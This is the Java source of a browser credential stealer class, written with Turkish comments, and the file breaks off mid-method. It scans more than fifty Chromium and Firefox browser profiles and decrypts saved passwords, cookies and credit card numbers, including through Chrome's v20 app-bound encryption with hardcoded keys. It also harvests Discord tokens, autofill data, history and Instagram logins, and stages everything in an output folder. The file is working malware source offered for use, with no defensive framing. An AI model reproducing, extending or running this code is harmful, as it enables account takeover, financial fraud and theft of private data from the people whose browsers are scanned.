package itzgonza.hollyshit.utils.decrypt;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

import java.nio.charset.StandardCharsets;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;

import itzgonza.hollyshit.utils.utilities;

public class DecryptManager extends utilities {

    @Override
    public void initialize() throws Exception {
        loadElevatedKey();
        scanAllBrowsers();
    }

    private void loadElevatedKey() {
        try {
            File[] possibleFiles = {
                    new File(System.getProperty("java.io.tmpdir"), "chrome_key.txt"),
                    new File(System.getProperty("java.io.tmpdir"), "key.txt")
            };

            // Wait up to 15 seconds for the key (Optimized for speed)
            for (int i = 0; i < 15; i++) {
                for (File f : possibleFiles) {
                    if (f.exists() && f.length() > 0) {
                        String content = new String(java.nio.file.Files.readAllBytes(f.toPath())).trim();
                        ELEVATED_KEY = Base64.getDecoder().decode(content);
                        System.out.println("[INFO] Elevated key loaded successfully.");
                        return;
                    }
                }
                Thread.sleep(500);
            }
            System.err.println("[WARN] Elevated key not found immediately, continuing...");
        } catch (Exception ignored) {
        }
    }

    public static int autoFillsCount = 0;
    public static int passwordsCount = 0;
    public static int cardsCount = 0;
    public static int cookiesCount = 0;
    public static int historyCount = 0;

    // Legacy chromelevator key (fallback)
    private static byte[] ELEVATED_KEY = null;
    // v10/v11 master keys per browser
    private static final java.util.Map<String, byte[]> BROWSER_KEYS = new java.util.HashMap<>();
    // v20 app-bound master keys per browser (new proper derivation)
    private static final java.util.Map<String, byte[]> V20_BROWSER_KEYS = new java.util.HashMap<>();

    // ---------- Hardcoded Chrome v20 derivation keys (from Chrome source)
    // ----------
    // Flag 1: AES-GCM key
    private static final byte[] V20_FLAG1_KEY = hexToBytes(
            "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787");
    // Flag 2: ChaCha20-Poly1305 key
    private static final byte[] V20_FLAG2_KEY = hexToBytes(
            "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660");
    // Flag 3: XOR key applied after NCrypt decryption
    private static final byte[] V20_FLAG3_XOR = hexToBytes(
            "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390");

    public static List<String> instagram_accounts = new ArrayList<>();

    // Tüm olası cookie dosyaları (Profil klasörü içinde aranacak)
    private static final String[] COOKIE_FILES = {
            "Cookies", "Cookies.db", "Network/Cookies", "Network/Cookies.db",
            "Local Storage/leveldb", "Session Storage/leveldb", "IndexedDB",
            "Service Worker/CacheStorage", "Local Extension Settings", "Web Data"
    };

    // Tüm olası login data dosyaları (Profil klasörü içinde aranacak)
    private static final String[] LOGIN_FILES = {
            "Login Data", "Login Data.db", "Login Data For Account", "Web Data"
    };

    private static final List<BrowserConfig> BROWSERS = Arrays.asList(
            new BrowserConfig("Google Chrome", System.getenv("LOCALAPPDATA") + "/Google/Chrome/User Data"),
            new BrowserConfig("Google Chrome Beta", System.getenv("LOCALAPPDATA") + "/Google/Chrome Beta/User Data"),
            new BrowserConfig("Google Chrome Dev", System.getenv("LOCALAPPDATA") + "/Google/Chrome Dev/User Data"),
            new BrowserConfig("Google Chrome Canary", System.getenv("LOCALAPPDATA") + "/Google/Chrome SxS/User Data"),
            new BrowserConfig("Google Chrome Unstable",
                    System.getenv("LOCALAPPDATA") + "/Google/Chrome Unstable/User Data"),
            new BrowserConfig("Edge", System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data"),
            new BrowserConfig("Edge Beta", System.getenv("LOCALAPPDATA") + "/Microsoft/Edge Beta/User Data"),
            new BrowserConfig("Edge Dev", System.getenv("LOCALAPPDATA") + "/Microsoft/Edge Dev/User Data"),
            new BrowserConfig("Edge Canary", System.getenv("LOCALAPPDATA") + "/Microsoft/Edge Canary/User Data"),
            new BrowserConfig("Brave", System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data"),
            new BrowserConfig("Brave Beta",
                    System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser-Beta/User Data"),
            new BrowserConfig("Brave Dev",
                    System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser-Dev/User Data"),
            new BrowserConfig("Brave Nightly",
                    System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser-Nightly/User Data"),
            new BrowserConfig("Opera", System.getenv("APPDATA") + "/Opera Software/Opera Stable"),
            new BrowserConfig("Opera GX", System.getenv("APPDATA") + "/Opera Software/Opera GX Stable"),
            new BrowserConfig("Opera Beta", System.getenv("APPDATA") + "/Opera Software/Opera Beta"),
            new BrowserConfig("Opera Developer", System.getenv("APPDATA") + "/Opera Software/Opera Developer"),
            new BrowserConfig("Opera Crypto", System.getenv("APPDATA") + "/Opera Software/Opera Crypto"),
            new BrowserConfig("Vivaldi", System.getenv("LOCALAPPDATA") + "/Vivaldi/User Data"),
            new BrowserConfig("Vivaldi Snapshot", System.getenv("LOCALAPPDATA") + "/Vivaldi/Snapshot/User Data"),
            new BrowserConfig("Yandex", System.getenv("LOCALAPPDATA") + "/Yandex/YandexBrowser/User Data"),
            new BrowserConfig("Arc", System.getenv("LOCALAPPDATA") + "/The Browser Company/Arc/User Data"),
            new BrowserConfig("Sidekick", System.getenv("LOCALAPPDATA") + "/Mecha/Sidekick/User Data"),
            new BrowserConfig("Slimjet", System.getenv("LOCALAPPDATA") + "/Slimjet/User Data"),
            new BrowserConfig("SRWare Iron", System.getenv("LOCALAPPDATA") + "/SRWare Iron/User Data"),
            new BrowserConfig("Comodo Dragon", System.getenv("LOCALAPPDATA") + "/Comodo/Dragon/User Data"),
            new BrowserConfig("Comodo IceDragon", System.getenv("LOCALAPPDATA") + "/Comodo/IceDragon/User Data"),
            new BrowserConfig("Epic Privacy Browser",
                    System.getenv("LOCALAPPDATA") + "/Epic Privacy Browser/User Data"),
            new BrowserConfig("Coc Coc", System.getenv("LOCALAPPDATA") + "/Coc Coc/Browser/User Data"),
            new BrowserConfig("Cent Browser", System.getenv("LOCALAPPDATA") + "/CentBrowser/User Data"),
            new BrowserConfig("7Star", System.getenv("LOCALAPPDATA") + "/7Star/7Star/User Data"),
            new BrowserConfig("Amigo", System.getenv("LOCALAPPDATA") + "/Amigo/User Data"),
            new BrowserConfig("Torch", System.getenv("LOCALAPPDATA") + "/Torch/User Data"),
            new BrowserConfig("Sogou Explorer", System.getenv("LOCALAPPDATA") + "/SogouExplorer/Webkit/Default"),
            new BrowserConfig("UC Browser", System.getenv("LOCALAPPDATA") + "/UCBrowser/User Data Default"),
            new BrowserConfig("QIP Surf", System.getenv("LOCALAPPDATA") + "/QIP Surf/User Data"),
            new BrowserConfig("RockMelt", System.getenv("LOCALAPPDATA") + "/RockMelt/User Data"),
            new BrowserConfig("Flock", System.getenv("LOCALAPPDATA") + "/Flock/Browser/User Data"),
            new BrowserConfig("Bowser", System.getenv("LOCALAPPDATA") + "/Bowser/User Data"),
            new BrowserConfig("Orbitum", System.getenv("LOCALAPPDATA") + "/Orbitum/User Data"),
            new BrowserConfig("Sputnik", System.getenv("LOCALAPPDATA") + "/Sputnik/Sputnik/User Data"),
            new BrowserConfig("Chedot", System.getenv("LOCALAPPDATA") + "/Chedot/User Data"),
            new BrowserConfig("Kometa", System.getenv("LOCALAPPDATA") + "/Kometa/User Data"),
            new BrowserConfig("360 Browser", System.getenv("LOCALAPPDATA") + "/360Chrome/Chrome/User Data"),
            new BrowserConfig("360 Extreme", System.getenv("LOCALAPPDATA") + "/360Chrome/Chrome/User Data"),
            new BrowserConfig("AVG Browser", System.getenv("LOCALAPPDATA") + "/AVG/Browser/User Data"),
            new BrowserConfig("AVG Secure Browser", System.getenv("LOCALAPPDATA") + "/AVG/AvgSecureBrowser/User Data"),
            new BrowserConfig("AVAST Browser", System.getenv("LOCALAPPDATA") + "/AVAST Software/Browser/User Data"),
            new BrowserConfig("AVAST Secure Browser",
                    System.getenv("LOCALAPPDATA") + "/AVAST Software/AvastSecureBrowser/User Data"),
            new BrowserConfig("Uran", System.getenv("LOCALAPPDATA") + "/uCozMedia/Uran/User Data"),
            new BrowserConfig("Iridium", System.getenv("LOCALAPPDATA") + "/Iridium/User Data"),
            new BrowserConfig("Chromium", System.getenv("LOCALAPPDATA") + "/Chromium/User Data"),
            new BrowserConfig("Ungoogled Chromium", System.getenv("LOCALAPPDATA") + "/Ungoogled Chromium/User Data"),
            new BrowserConfig("Whale", System.getenv("LOCALAPPDATA") + "/Naver/Whale/User Data"),
            new BrowserConfig("Maxthon", System.getenv("LOCALAPPDATA") + "/Maxthon/User Data"),
            new BrowserConfig("Samsung Internet",
                    System.getenv("LOCALAPPDATA") + "/Samsung/Samsung Internet/User Data"));

    private static final List<BrowserConfig> FIREFOX_BROWSERS = Arrays.asList(
            new BrowserConfig("Mozilla Firefox", System.getenv("APPDATA") + "/Mozilla/Firefox/Profiles"),
            new BrowserConfig("Mozilla Firefox ESR", System.getenv("APPDATA") + "/Mozilla/Firefox ESR/Profiles"),
            new BrowserConfig("Waterfox", System.getenv("APPDATA") + "/Waterfox/Profiles"),
            new BrowserConfig("Cyberfox", System.getenv("APPDATA") + "/8pecxstudios/Cyberfox/Profiles"),
            new BrowserConfig("Pale Moon", System.getenv("APPDATA") + "/Moonchild Productions/Pale Moon/Profiles"),
            new BrowserConfig("IceDragon", System.getenv("APPDATA") + "/Comodo/IceDragon/Profiles"),
            new BrowserConfig("SeaMonkey", System.getenv("APPDATA") + "/Mozilla/SeaMonkey/Profiles"),
            new BrowserConfig("K-Meleon", System.getenv("APPDATA") + "/K-Meleon/Profiles"));

    // TÜM TARAYICILARI VE TÜM PROFİLLERİ TARA (Paralel)
    public void scanAllBrowsers() {
        System.out.println("[INFO] Derin Tarama başlatılıyor (Paralel Mod)...");
        
        java.util.concurrent.ExecutorService browserExecutor = java.util.concurrent.Executors.newFixedThreadPool(8);
        List<java.util.concurrent.CompletableFuture<Void>> futures = new java.util.ArrayList<>();

        // Chromium tabanlı tarayıcılar
        for (BrowserConfig browser : BROWSERS) {
            futures.add(java.util.concurrent.CompletableFuture.runAsync(() -> {
                scanChromiumBrowser(browser);
            }, browserExecutor));
        }

        // Firefox tabanlı tarayıcılar
        for (BrowserConfig browser : FIREFOX_BROWSERS) {
            futures.add(java.util.concurrent.CompletableFuture.runAsync(() -> {
                scanFirefoxBrowser(browser);
            }, browserExecutor));
        }

        java.util.concurrent.CompletableFuture.allOf(futures.toArray(new java.util.concurrent.CompletableFuture[0])).join();
        browserExecutor.shutdown();
        System.out.println("[SUCCESS] Tüm tarayıcı taramaları tamamlandı.");
    }

    private void scanChromiumBrowser(BrowserConfig browser) {
        File userDataDir = new File(browser.path);
        if (!userDataDir.exists()) return;

        byte[] masterKey = extractMasterKey(browser.path);
        byte[] v20MasterKey = extractV20MasterKey(browser.path);

        synchronized (BROWSER_KEYS) {
            if (masterKey != null) BROWSER_KEYS.put(browser.path, masterKey);
            if (v20MasterKey != null) V20_BROWSER_KEYS.put(browser.path, v20MasterKey);
        }

        List<File> allProfiles = findAllPotentialProfiles(userDataDir);
        for (File profileDir : allProfiles) {
            processChromiumProfile(browser, profileDir);
        }
    }

    private void processChromiumProfile(BrowserConfig browser, File profileDir) {
        try {
            String profileName = profileDir.getName();
            File rawDir = new File(utilities.getPath() + "/Browser_datas2/" + browser.name + "/" + profileName + "/raw_files");
            rawDir.mkdirs();

            // Local State
            File localStateFile = new File(browser.path, "Local State");
            if (localStateFile.exists()) {
                Path tempLs = robustCopy(localStateFile.getAbsolutePath());
                if (tempLs != null) {
                    Files.copy(tempLs, new File(rawDir, "Local State").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                    Files.deleteIfExists(tempLs);
                }
            }

            // Login Data
            for (String loginFileName : LOGIN_FILES) {
                File loginFile = new File(profileDir, loginFileName);
                if (!loginFile.exists()) continue;
                Path tempLogin = robustCopy(loginFile.getAbsolutePath());
                if (tempLogin != null) {
                    String passwords = processPasswords(tempLogin.toString(), browser.path);
                    if (!passwords.isEmpty()) saveData(browser.name, profileName, "passwords", passwords);
                    Files.copy(tempLogin, new File(rawDir, loginFileName).toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                    Files.deleteIfExists(tempLogin);
                }
            }

            // Cookies
            for (String cookieFileName : COOKIE_FILES) {
                File cookieFile = new File(profileDir, cookieFileName);
                if (!cookieFile.exists()) continue;
                if (cookieFile.isDirectory()) {
                    if (cookieFile.getName().contains("leveldb") || cookieFile.getName().contains("Local Storage")) {
                        processLevelDB(cookieFile, browser.name, profileName);
                    }
                    continue;
                }
                Path tempCookie = robustCopy(cookieFile.getAbsolutePath());
                if (tempCookie != null) {
                    if (cookieFile.getName().contains("Cookies") || cookieFile.getName().contains("Safe Browsing Cookies")) {
                        String cookies = getCookies(tempCookie.toString(), browser.path);
                        if (!cookies.isEmpty()) saveData(browser.name, profileName, "cookies", cookies);
                    }
                    Files.copy(tempCookie, new File(rawDir, cookieFile.getName()).toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                    Files.deleteIfExists(tempCookie);
                }
            }

            // Web Data & History
            processChromiumExtras(browser, profileDir, rawDir);

        } catch (Exception ignored) {}
    }

    private void processChromiumExtras(BrowserConfig browser, File profileDir, File rawDir) throws Exception {
        // Web Data
        File webDataFile = new File(profileDir, "Web Data");
        if (webDataFile.exists()) {
            Path tempWeb = robustCopy(webDataFile.getAbsolutePath());
            if (tempWeb != null) {
                Files.copy(tempWeb, new File(rawDir, "Web Data").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                String autofills = processDatabase(tempWeb.toString(), "autofill", "SELECT name, value FROM autofill");
                if (!autofills.isEmpty()) saveData(browser.name, profileDir.getName(), "autofill", autofills);
                String cards = processCards(tempWeb.toString(), browser.path);
                if (!cards.isEmpty()) saveData(browser.name, profileDir.getName(), "cards", cards);
                Files.deleteIfExists(tempWeb);
            }
        }

        // History
        File historyFile = new File(profileDir, "History");
        if (historyFile.exists()) {
            Path tempHistory = robustCopy(historyFile.getAbsolutePath());
            if (tempHistory != null) {
                Files.copy(tempHistory, new File(rawDir, "History").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                String history = processDatabase(tempHistory.toString(), "history", "SELECT url, title, last_visit_time FROM urls");
                if (!history.isEmpty()) saveData(browser.name, profileDir.getName(), "history", history);
                Files.deleteIfExists(tempHistory);
            }
        }
    }

    private void scanFirefoxBrowser(BrowserConfig browser) {
        try {
            File profilesDir = new File(browser.path);
            if (!profilesDir.exists()) return;
            File[] profiles = profilesDir.listFiles(File::isDirectory);
            if (profiles == null) return;

            for (File profile : profiles) {
                String profileName = profile.getName();
                File rawDir = new File(utilities.getPath() + "/Browser_datas2/" + browser.name + "/" + profileName + "/raw_files");
                rawDir.mkdirs();

                File cookiesDb = new File(profile, "cookies.sqlite");
                if (cookiesDb.exists()) {
                    Path tempCookies = robustCopy(cookiesDb.getAbsolutePath());
                    if (tempCookies != null) {
                        String cookies = getMozillaCookies(tempCookies.toString());
                        if (!cookies.isEmpty()) saveData(browser.name, profileName, "cookies", cookies);
                        Files.copy(tempCookies, new File(rawDir, "cookies.sqlite").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        Files.deleteIfExists(tempCookies);
                    }
                }
                
                File keyFile = new File(profile, "key4.db");
                File loginsFile = new File(profile, "logins.json");
                if (keyFile.exists() && loginsFile.exists()) {
                    FileUtils.copyFileToDirectory(keyFile, rawDir);
                    FileUtils.copyFileToDirectory(loginsFile, rawDir);
                }

                File historyDb = new File(profile, "places.sqlite");
                if (historyDb.exists()) {
                    Path tempHistory = robustCopy(historyDb.getAbsolutePath());
                    if (tempHistory != null) {
                        String history = processDatabase(tempHistory.toString(), "history", "SELECT url, title, last_visit_date FROM moz_places");
                        if (!history.isEmpty()) saveData(browser.name, profileName, "history", history);
                        Files.copy(tempHistory, new File(rawDir, "places.sqlite").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        Files.deleteIfExists(tempHistory);
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    private List<File> findAllPotentialProfiles(File userDataDir) {
        List<File> profiles = new ArrayList<>();
        if (userDataDir == null || !userDataDir.exists())
            return profiles;

        File[] children = userDataDir.listFiles(File::isDirectory);
        if (children != null) {
            for (File child : children) {
                String name = child.getName().toLowerCase();
                if (BLACKLISTED_FOLDERS.contains(name))
                    continue;

                // If it has ANY data, it's a profile
                if (isLikelyProfile(child)) {
                    profiles.add(child);
                } else {
                    // One more level deep just in case (for nested structures)
                    File[] subChildren = child.listFiles(File::isDirectory);
                    if (subChildren != null) {
                        for (File sub : subChildren) {
                            if (isLikelyProfile(sub))
                                profiles.add(sub);
                        }
                    }
                }
            }
        }

        // Also always include Default and Profile X specifically
        File def = new File(userDataDir, "Default");
        if (def.exists())
            profiles.add(def);
        for (int i = 0; i < 100; i++) {
            File p = new File(userDataDir, "Profile " + i);
            if (p.exists())
                profiles.add(p);
        }

        return profiles.stream().distinct().collect(Collectors.toList());
    }

    private static final List<String> BLACKLISTED_FOLDERS = Arrays.asList(
            "swreporter", "crashpad", "widevinecdm", "grshadercache", "shadercache",
            "graphitedawnshadercache", "zxcvbndata", "safetytips", "optimizationguidepredictionmodels",
            "filetypepolicies", "crowddeny", "origin trials", "certificaterevocation",
            "subresource filter", "browsermetrics", "evwhitelist", "meipreload",
            "sslerorassistant", "privacy sandbox attestations", "locales", "extensions", "dictionaries");

    private boolean isLikelyProfile(File folder) {
        if (folder == null || !folder.exists() || !folder.isDirectory())
            return false;

        // Marker check
        String[] markers = { "Login Data", "Web Data", "Cookies", "History", "Preferences", "Network", "key4.db",
                "logins.json", "cookies.sqlite" };
        for (String m : markers) {
            if (new File(folder, m).exists())
                return true;
        }

        // Name check fallback
        String name = folder.getName();
        return name.equals("Default") || name.startsWith("Profile ") || name.startsWith("Person ");
    }

    private void processLevelDB(File leveldbDir, String browserName, String profileName) {
        try {
            File[] files = leveldbDir.listFiles();
            if (files == null)
                return;

            StringBuilder tokens = new StringBuilder();

            for (File file : files) {
                if (file.getName().endsWith(".log") || file.getName().endsWith(".ldb")) {
                    Path tempFile = robustCopy(file.getAbsolutePath());
                    if (tempFile != null) {
                        String fileContent = FileUtils.readFileToString(tempFile.toFile(), StandardCharsets.UTF_8);

                        // Discord token regex
                        java.util.regex.Pattern tokenPattern = java.util.regex.Pattern.compile(
                                "dQw4w9WgXcQ:[\\w-]+|mfa\\.[\\w-]+\\.[\\w-]+|[\"']token[\"']\\s*:\\s*[\"']([^\"']+)[\"']");
                        java.util.regex.Matcher matcher = tokenPattern.matcher(fileContent);

                        while (matcher.find()) {
                            tokens.append(matcher.group()).append("\n");
                        }
                        Files.deleteIfExists(tempFile);
                    }
                }
            }

            if (tokens.length() > 0) {
                saveData(browserName, profileName, "tokens", tokens.toString());
            }
        } catch (Exception ignored) {
        }
    }

    public static List<String> findAllDrives() {
        List<String> drives = new ArrayList<>();
        File[] roots = File.listRoots();
        for (File root : roots) {
            drives.add(root.getAbsolutePath());
        }
        return drives;
    }

    private void saveData(String browser, String profile, String type, String data) {
        try {
            // Kullanıcının istediği spesifik yapı: Browser_datas2/{Tarayıcı}/{Profil}
            File outputFile = new File(
                    utilities.getPath() + "/Browser_datas2/" + browser + "/" + profile + "/" + type + ".txt");
            outputFile.getParentFile().mkdirs();
            FileUtils.writeStringToFile(outputFile, data, StandardCharsets.UTF_8, true);
            utilities.content.add(browser.toLowerCase());
        } catch (Exception ignored) {
        }
    }

    private String processDatabase(String dbPath, String type, String query) {
        try {
            Path tempFile = robustCopy(dbPath);
            if (tempFile == null)
                return "";

            Class.forName("org.sqlite.JDBC");
            Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement stmt = conn.createStatement();
            stmt.setQueryTimeout(30);

            ResultSet rs = stmt.executeQuery(query);
            List<String> results = new ArrayList<>();

            while (rs.next()) {
                String name = rs.getString(1);
                String value = rs.getString(2);
                if (name != null && value != null && !name.isEmpty() && !value.isEmpty()) {
                    results.add(name + ": " + value);
                }
            }
            rs.close();
            stmt.close();
            conn.close();

            results = results.stream().distinct().collect(Collectors.toList());
            Collections.sort(results, Comparator.comparingInt(String::length).reversed());

            if (type.equals("autofill"))
                autoFillsCount += results.size();
            else if (type.equals("history"))
                historyCount += results.size();

            Files.deleteIfExists(tempFile);
            return String.join("\n", results);
        } catch (Exception ignored) {
        }
        return "";
    }

    // --- Compatibility Wrappers for Browser classes ---
    public String getCookies(String dbPath, String browserPath) {
        return processCookies(dbPath, browserPath);
    }

    public String getPasswords(String dbPath, String browserPath) {
        return processPasswords(dbPath, browserPath);
    }

    public String getCards(String dbPath, String browserPath) {
        return processCards(dbPath, browserPath);
    }

    public String getAutofills(String dbPath) {
        return processDatabase(dbPath, "autofill", "SELECT name, value FROM autofill");
    }
    // --------------------------------------------------

    private String processPasswords(String dbPath, String browserPath) {
        try {
            Path tempFile = robustCopy(dbPath);
            if (tempFile == null)
                return "";

            Class.forName("org.sqlite.JDBC");
            Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement stmt = conn.createStatement();
            stmt.setQueryTimeout(30);

            ResultSet rs = stmt.executeQuery("SELECT origin_url, username_value, password_value FROM logins");
            List<String> passwords = new ArrayList<>();

            while (rs.next()) {
                String url = rs.getString("origin_url");
                String username = rs.getString("username_value");
                byte[] encryptedPassword = rs.getBytes("password_value");

                if (encryptedPassword != null && encryptedPassword.length > 0) {
                    String decryptedPassword = decrypt(browserPath, encryptedPassword);
                    if (decryptedPassword != null && !decryptedPassword.equals("null")
                            && !decryptedPassword.isEmpty()) {
                        String entry = "URL: " + url + "\nUsername: " + username + "\nPassword: " + decryptedPassword;
                        passwords.add(entry);

                        if (url != null && url.toLowerCase().contains("instagram")) {
                            instagram_accounts.add(username + ":" + decryptedPassword);
                        }
                    }
                }
            }
            rs.close();
            stmt.close();
            conn.close();

            passwords = passwords.stream().distinct().collect(Collectors.toList());
            passwordsCount += passwords.size();

            Files.deleteIfExists(tempFile);
            return String.join("\n\n", passwords);
        } catch (Exception e) {
            // System.err.println("[DEBUG] Passwords error: " + e.getMessage());
        }
        return "";
    }

    private String processCards(String dbPath, String browserPath) {
        try {
            Path tempFile = robustCopy(dbPath);
            if (tempFile == null)
                return "";

            Class.forName("org.sqlite.JDBC");
            Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement stmt = conn.createStatement();
            stmt.setQueryTimeout(30);

            ResultSet rs = stmt.executeQuery(
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards");
            List<String> cards = new ArrayList<>();

            while (rs.next()) {
                String name = rs.getString("name_on_card");
                String expMonth = rs.getString("expiration_month");
                String expYear = rs.getString("expiration_year");
                byte[] encryptedCard = rs.getBytes("card_number_encrypted");

                if (encryptedCard != null && encryptedCard.length > 0) {
                    String decryptedCard = decrypt(browserPath, encryptedCard);
                    if (decryptedCard != null && !decryptedCard.equals("null") && !decryptedCard.isEmpty()) {
                        String entry = "Card: " + decryptedCard + "\nName: " + name + "\nExpires: " + expMonth + "/"
                                + expYear;
                        cards.add(entry);
                    }
                }
            }
            rs.close();
            stmt.close();
            conn.close();

            cards = cards.stream().distinct().collect(Collectors.toList());
            cardsCount += cards.size();

            Files.deleteIfExists(tempFile);
            return String.join("\n\n", cards);
        } catch (Exception ignored) {
        }
        return "";
    }

    private String processCookies(String dbPath, String browserPath) {
        try {
            if (!Files.exists(Paths.get(dbPath)))
                return "";

            Path tempFile = robustCopy(dbPath);
            if (tempFile == null)
                return "";

            Class.forName("org.sqlite.JDBC");
            Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement stmt = conn.createStatement();
            stmt.setQueryTimeout(30);

            ResultSet rs = stmt
                    .executeQuery("SELECT host_key, is_secure, path, is_httponly, name, encrypted_value FROM cookies");
            List<String> cookies = new ArrayList<>();

            while (rs.next()) {
                String host = rs.getString("host_key");
                String isSecure = rs.getString("is_secure");
                String path = rs.getString("path");
                String isHttpOnly = rs.getString("is_httponly");
                String name = rs.getString("name");
                byte[] encryptedValue = rs.getBytes("encrypted_value");

                if (encryptedValue != null && encryptedValue.length > 0 && host != null) {
                    String decryptedValue = decrypt(browserPath, encryptedValue);
                    if (decryptedValue != null && !decryptedValue.equals("null") && !decryptedValue.isEmpty()) {
                        String cookie = host + "\t" + (isSecure.equals("1") ? "TRUE" : "FALSE") + "\t" + path + "\t"
                                + (isHttpOnly.equals("1") ? "TRUE" : "FALSE") + "\t" + "2597573456"
                                + "\t" + name + "\t" + decryptedValue;
                        cookies.add(cookie);
                    }
                }
            }
            rs.close();
            stmt.close();
            conn.close();

            cookies = cookies.stream().distinct().collect(Collectors.toList());
            cookiesCount += cookies.size();

            Files.deleteIfExists(tempFile);
            return String.join("\n", cookies);
        } catch (Exception ignored) {
        }
        return "";
    }

    public String getMozillaCookies(String dbPath) {
        try {
            Path tempFile = robustCopy(dbPath);
            if (tempFile == null)
                return "";

            Class.forName("org.sqlite.JDBC");
            Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement stmt = conn.createStatement();
            stmt.setQueryTimeout(30);

            ResultSet rs = stmt.executeQuery("SELECT host, isSecure, path, isHttpOnly, name, value FROM moz_cookies");
            List<String> cookies = new ArrayList<>();

            while (rs.next()) {
                String host = rs.getString("host");
                String isSecure = rs.getString("isSecure");
                String path = rs.getString("path");
                String isHttpOnly = rs.getString("isHttpOnly");
                String name = rs.getString("name");
                String value = rs.getString("value");

                if (host != null && value != null && !value.isEmpty()) {
                    String cookie = host + "\t" + isSecure + "\t" + path + "\t" + isHttpOnly + "\t" + "2597573456"
                            + "\t" + name + "\t" + value;
                    cookies.add(cookie);
                }
            }
            rs.close();
            stmt.close();
            conn.close();

            cookies = cookies.stream().distinct().collect(Collectors.toList());
            cookiesCount += cookies.size();

            Files.deleteIfExists(tempFile);
            return String.join("\n", cookies);
        } catch (Exception ignored) {
        }
        return "";
    }

    public static String decrypt(String browserPath, byte[] encryptedData) throws Exception {
        if (encryptedData == null || encryptedData.length < 3)
            return null;

        String dataString = new String(encryptedData, 0, Math.min(encryptedData.length, 3), StandardCharsets.UTF_8);

        // --- CASE 1: AES-GCM (v10, v11) ---
        if (dataString.startsWith("v10") || dataString.startsWith("v11")) {
            if (encryptedData.length < 15)
                return null;

            byte[] masterKey = BROWSER_KEYS.get(browserPath);
            if (masterKey == null) {
                masterKey = extractMasterKey(browserPath);
                if (masterKey != null)
                    BROWSER_KEYS.put(browserPath, masterKey);
            }
            if (masterKey == null)
                return null;

            try {
                byte[] nonce = Arrays.copyOfRange(encryptedData, 3, 15);
                byte[] ciphertext = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(masterKey, "AES"), new GCMParameterSpec(128, nonce));
                byte[] decrypted = cipher.doFinal(ciphertext);
                return new String(decrypted, StandardCharsets.UTF_8);
            } catch (Exception ignored) {
                return null;
            }
        }

        // --- CASE 2: AES-GCM (v20) — proper double-DPAPI + blob-parse derivation ---
        else if (dataString.startsWith("v20")) {
            if (encryptedData.length < 15)
                return null;

            // 1st choice: proper v20 key via app_bound_encrypted_key flow
            byte[] masterKey = V20_BROWSER_KEYS.get(browserPath);
            if (masterKey == null) {
                masterKey = extractV20MasterKey(browserPath);
                if (masterKey != null) {
                    V20_BROWSER_KEYS.put(browserPath, masterKey);
                    System.out.println("[v20] Extracted proper app-bound master key for: " + browserPath);
                }
            }
            // Fallback: chromelevator key
            if (masterKey == null)
                masterKey = ELEVATED_KEY;
            if (masterKey == null)
                return null;

            try {
                // v20 layout: [3 prefix][12 nonce][variable ct+tag]
                byte[] nonce = Arrays.copyOfRange(encryptedData, 3, 15);
                byte[] ciphertext = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(masterKey, "AES"), new GCMParameterSpec(128, nonce));
                byte[] decrypted = cipher.doFinal(ciphertext);
                // v20 prepends 32 bytes of header we must skip
                if (decrypted.length > 32) {
                    return new String(decrypted, 32, decrypted.length - 32, StandardCharsets.UTF_8);
                }
                return new String(decrypted, StandardCharsets.UTF_8);
            } catch (Exception ignored) {
                return null;
            }
        }

        // --- CASE 3: Legacy DPAPI (Pre-AES Versions) ---
        else {
            try {
                byte[] decrypted = Crypt32Util.cryptUnprotectData(encryptedData);
                return new String(decrypted, StandardCharsets.UTF_8);
            } catch (Exception e) {
                return decryptDirectDPAPI(encryptedData);
            }
        }
    }

    // =====================================================================
    // v20 App-Bound Encryption — Full Derivation Flow
    // Mirrors the Python reference implementation exactly.
    // =====================================================================

    /**
     * Extracts the v20 master key from the browser's Local State.
     * Flow: app_bound_encrypted_key → strip APPB → SYSTEM DPAPI → User DPAPI →
     * parse blob → derive key
     */
    private static byte[] extractV20MasterKey(String browserPath) {
        try {
            File localStateFile = new File(browserPath, "Local State");
            if (!localStateFile.exists())
                return null;

            // Use robustCopy for Local State to avoid locking
